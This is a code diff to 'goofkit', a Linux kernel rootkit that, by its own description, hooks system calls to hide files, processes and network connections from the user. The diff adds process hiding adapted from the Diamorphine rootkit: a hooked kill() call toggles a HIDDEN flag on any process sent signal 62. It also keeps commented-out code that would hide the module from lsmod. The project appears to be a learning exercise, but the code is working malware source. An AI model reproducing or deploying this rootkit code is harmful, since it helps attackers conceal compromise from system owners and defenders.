@@ -1,12 +1,13 @@
 /*
 Project: goofkit
-Author: Jack "Hulto" McKenna & Rayne Cafaro
+Author: Jack "Hulto" McKenna 🇺🇸  & Rayne Cafaro🤔
 Description: trampolining rootkit. Used to hide files, proccesses, and network connections from the user.
 
 Task:
 ## Comms with rootkti ##
 */
 
+#include <linux/sched.h>
 #include <linux/version.h>
 #include <linux/err.h>
 #include <linux/kernel.h>
@@ -48,11 +49,12 @@ Task:
 //Declare macros - Should be in header
 //#define KILL_SIG 61
 #define HIDE_SIG 62
+#define HIDDEN 0x10000000
 #define ESC_SIG 63
 
 //Declare vars
 static unsigned long *__sys_call_table;
-
+int is_hidden_proc(pid_t pid);
 unsigned char * create_tramp(unsigned long *dst, unsigned long *src, unsigned int id, unsigned int h_len);
 
 int HOOK_LEN = 15;
@@ -159,14 +161,6 @@ int goofy_uname(struct utsname *buf){
 	return ret;
 }
 
-int is_hidden_proc(pid_t pid){
-	//Skeleton code
-	if (pid == 24301){
-		return 1;
-	}
-	return 0;
-}
-
 int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int count){
 	//Execute original funciton
 	int (*func_ptr)(unsigned int, struct linux_dirent *, unsigned int) = (void *)hooks[1]->trampoline;
@@ -225,19 +219,48 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 	return ret;	
 }
 
+
+//### Credit: https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c ###
+//More efficent than using an expanding array of PIDs
+struct task_struct *find_task(pid_t pid){
+	struct task_struct *tmp = current;
+	for_each_process(tmp) {
+		if(tmp->pid == pid){
+			return tmp;
+		}
+	}
+	return NULL;
+}
+
+int is_hidden_proc(pid_t pid){
+
+	if(pid == 0){ return 0; }
+	struct task_struct *res;
+	res = find_task(pid);
+	if(res == 0){ return 0; }
+	if(res->flags & HIDDEN){
+		return 1;
+	}
+
+	return 0;
+}
+
+//### END CREDIT ###
+
 int goofy_kill(pid_t pid, int sig){
 	printk("[goof] goofy_kill\n");
 	/*FAULT - invalid opcode - Relative jump is wreking everything :(*/
 	//int (*func_ptr)(pid_t, int) = (void *)hooks[2]->trampoline;
 	//int ret = func_ptr(pid, sig);
+	struct task_struct *res;
 	if(sig == HIDE_SIG){
-		printk("[goof] LMAO %d\n", (unsigned int)pid);
+		//pid_task(find_vpid(pid), PIDTYPE_PID); --- doesn't work b/c we're not GPL
+		res = find_task(pid);
+		//XOR allows us to hide and unhide the process
+		res->flags ^= HIDDEN;
 		return 0;
 	}
 	int ret = original_kill(pid, sig);
-
-
-
 	return ret;
 }
 
@@ -334,8 +357,8 @@ int hooks_count = 3;
 static int __init
 goof_init(void) {
 	//Hide kernel module from lsmod 
-//	list_del_init(&__this_module.list);
-//	kobject_del(&THIS_MODULE->mkobj.kobj);
+	//list_del_init(&__this_module.list);
+	//kobject_del(&THIS_MODULE->mkobj.kobj);
 
 	printk("[goof] module loaded\n");
 
